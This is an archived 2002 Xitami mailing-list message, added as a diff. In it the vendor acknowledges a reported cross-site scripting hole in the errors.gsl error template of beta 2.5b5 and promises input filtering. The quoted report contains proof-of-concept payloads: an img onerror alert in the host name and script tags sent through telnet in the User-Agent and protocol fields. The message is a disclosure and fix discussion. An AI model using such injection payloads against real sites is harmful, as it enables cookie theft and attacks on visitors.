@@ -1,0 +1,147 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+   <TITLE> [Xitami] Re: Errors.gsl Script Injection Vulnerability
+   </TITLE>
+   <LINK REL="Index" HREF="index.html" >
+   <LINK REL="made" HREF="mailto:xitami%40lists.xitami.org">
+   <META NAME="robots" CONTENT="index,nofollow">
+   
+   <LINK REL="Previous"  HREF="003417.html">
+   <LINK REL="Next"  HREF="003420.html">
+ </HEAD>
+ <BODY BGCOLOR="#ffffff">
+   <H1>[Xitami] Re: Errors.gsl Script Injection Vulnerability
+   </H1>
+    <B>Pieter Hintjens
+    </B> 
+    <A HREF="mailto:xitami%40lists.xitami.org"
+       TITLE="[Xitami] Re: Errors.gsl Script Injection Vulnerability">xitami@lists.xitami.org
+       </A><BR>
+    <I>Mon, 17 Jun 2002 09:44:58 +0200</I>
+    <P><UL>
+        <LI> Previous message: <A HREF="003417.html">[Xitami] htaccess
+</A></li>
+        <LI> Next message: <A HREF="003420.html">[Xitami] Xitami and PHP ??
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#3418">[ date ]</a>
+              <a href="thread.html#3418">[ thread ]</a>
+              <a href="subject.html#3418">[ subject ]</a>
+              <a href="author.html#3418">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>Matthew,
+
+Thanks for reporting this security hole.  Xitami 2.5b5 is a beta and 
+as such we do not recommend its use for production or public web 
+sites.  The production release of Xitami (2.4d9) does not use GSL and 
+is not subject to this attack.
+
+You should also note that the supplied script is an example that is 
+intended to show the available fields, and not hard-coded.  The web 
+site manager can easily remove references to any or all information 
+coming from the browser.  Further, GSL processing for errors is 
+disabled by default.
+
+However, we're grateful for your work and we will make changes to the 
+2.5b package to filter all information received from the browser 
+before showing it in error screens.
+
+I am forwarding this message to the Xitami discussion list, since we 
+do not believe it serves our users to hide information about such 
+vulnerabilities.
+
+Best regards,
+-
+Pieter Hintjens
+iMatix Corporation
+
+
+&gt;<i> There is a security hole in the 'errors.gsl' template that ships
+</I>&gt;<i> with Xitami 2.5b5 that may allow an attacker to run scripts
+</I>&gt;<i> against visiting users in the security zone of the targeted site; this
+</I>&gt;<i> allows for cookie theft, and other malicious actions.  My site,
+</I>&gt;<i> www.murphy.101main.net runs the Beta:
+</I>&gt;<i> 
+</I>&gt;<i> <A HREF="http://www.<IMG%20SRC=""%20ONERROR="alert%28'CSS'%29"">http://www.&lt;IMG%20SRC=&quot;&quot;%20ONERROR=&quot;alert%28'CSS'%29&quot;</A>&gt;.murphy.101main.
+</I>&gt;<i> net/er ror404
+</I>&gt;<i> 
+</I>&gt;<i> The &quot;/error404&quot; throws a 404 error and Xitami returns the
+</I>&gt;<i> following output:
+</I>&gt;<i> 
+</I>&gt;<i> &lt;HTML&gt;&lt;TITLE&gt;Error&lt;/TITLE&gt;&lt;BODY&gt;&lt;H1&gt;
+</I>&gt;<i> &lt;HTML&gt;&lt;BODY&gt;
+</I>&gt;<i> &lt;H2&gt;Error 404&lt;/H2&gt;
+</I>&gt;<i> &lt;H3&gt;Not found&lt;/H3&gt;
+</I>&gt;<i> &lt;P&gt;
+</I>&gt;<i> &lt;HR&gt;
+</I>&gt;<i> &lt;TABLE&gt;
+</I>&gt;<i> &lt;TR&gt;&lt;TD&gt;Server       &lt;/TD&gt;&lt;TD&gt;Xitami&lt;/TD&gt;&lt;/TR&gt;
+</I>&gt;<i> &lt;TR&gt;&lt;TD&gt;Version      &lt;/TD&gt;&lt;TD&gt;2.5b5&lt;/TD&gt;&lt;/TR&gt;
+</I>&gt;<i> &lt;TR&gt;&lt;TD&gt;Name         &lt;/TD&gt;&lt;TD&gt;www.&lt;img src=&quot;&quot;
+</I>&gt;<i> onerror=&quot;alert('css')&quot;&gt;.murphy.101main.net&lt;/TD&gt;&lt;/TR&gt;
+</I>&gt;<i> &lt;TR&gt;&lt;TD&gt;Full URL     &lt;/TD&gt;&lt;TD&gt;<A HREF="http://www.<img">http://www.&lt;img</A> src=&quot;&quot;
+</I>&gt;<i> onerror=&quot;alert('css')&quot;&gt;.murphy.101main.net/&lt;/TD&gt;&lt;/TR&gt;
+</I>&gt;<i> &lt;TR&gt;&lt;TD&gt;HTTP port    &lt;/TD&gt;&lt;TD&gt;0&lt;/TD&gt;&lt;/TR&gt;
+</I>&gt;<i> &lt;TR&gt;&lt;TD&gt;Protocol     &lt;/TD&gt;&lt;TD&gt;HTTP/1.1&lt;/TD&gt;&lt;/TR&gt;
+</I>&gt;<i> &lt;TR&gt;&lt;TD&gt;Your IP      &lt;/TD&gt;&lt;TD&gt;65.28.45.230&lt;/TD&gt;&lt;/TR&gt;
+</I>&gt;<i> &lt;TR&gt;&lt;TD&gt;Your browser &lt;/TD&gt;&lt;TD&gt;Mozilla/4.0 (compatible; MSIE 6.0;
+</I>&gt;<i> Windows 98; Win 9x 4.90; .NET CLR 1.0.3705)&lt;/TD&gt;&lt;/TR&gt; &lt;/TABLE&gt;
+</I>&gt;<i> &lt;/BODY&gt;&lt;/HTML&gt;
+</I>&gt;<i> 
+</I>&gt;<i> As you can see, this results in code injection because a NULL image
+</I>&gt;<i> fires the onError event, which displays the message, meaning that JS
+</I>&gt;<i> code is executed in the name of the site by the attacker against the
+</I>&gt;<i> visiting browser.  Also, no filtering is applied on the User-Agent
+</I>&gt;<i> that the server accepts for the error.  Take for example this Telnet
+</I>&gt;<i> session:
+</I>&gt;<i> 
+</I>&gt;<i> telnet localhost 80
+</I>&gt;<i> GET /error404 HTTP/1.0
+</I>&gt;<i> User-Agent: &lt;SCRIPT&gt;alert(&quot;UA Attack&quot;);
+</I>&gt;<i> 
+</I>&gt;<i> The HTTP protocol is not vulnerable; this seems to be replaced with
+</I>&gt;<i> &quot;HTTP/1.1&quot; when an invalid value is supplied:
+</I>&gt;<i> 
+</I>&gt;<i> telnet localhost 80
+</I>&gt;<i> GET /error404 HTTP/&lt;SCRIPT&gt;alert(&quot;Protocol Attack&quot;);&lt;/SCRIPT&gt;
+</I>&gt;<i> 
+</I>&gt;<i> This does nothing.
+</I>&gt;<i> 
+</I>&gt;<i> I have published an alert (no technical details) on my site here:
+</I>&gt;<i> 
+</I>&gt;<i> <A HREF="http://www.murphy.101main.net/vna-xitami.txt">http://www.murphy.101main.net/vna-xitami.txt</A>
+</I>&gt;<i> 
+</I>&gt;<i> I also plan to submit this alert to BugTraq and SecuriTeam
+</I>&gt;<i> immediately. If no reply is received within 7 days, technical details
+</I>&gt;<i> will be released to the public.
+</I>&gt;<i> 
+</I>&gt;<i> &quot;The reason the mainstream is thought
+</I>&gt;<i> of as a stream is because it is
+</I>&gt;<i> so shallow.&quot;
+</I>&gt;<i>                      - Author Unknown
+</I>&gt;<i> 
+</I>
+
+
+
+</PRE>
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI> Previous message: <A HREF="003417.html">[Xitami] htaccess
+</A></li>
+	<LI> Next message: <A HREF="003420.html">[Xitami] Xitami and PHP ??
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#3418">[ date ]</a>
+              <a href="thread.html#3418">[ thread ]</a>
+              <a href="subject.html#3418">[ subject ]</a>
+              <a href="author.html#3418">[ author ]</a>
+         </LI>
+       </UL>
+</body></html>
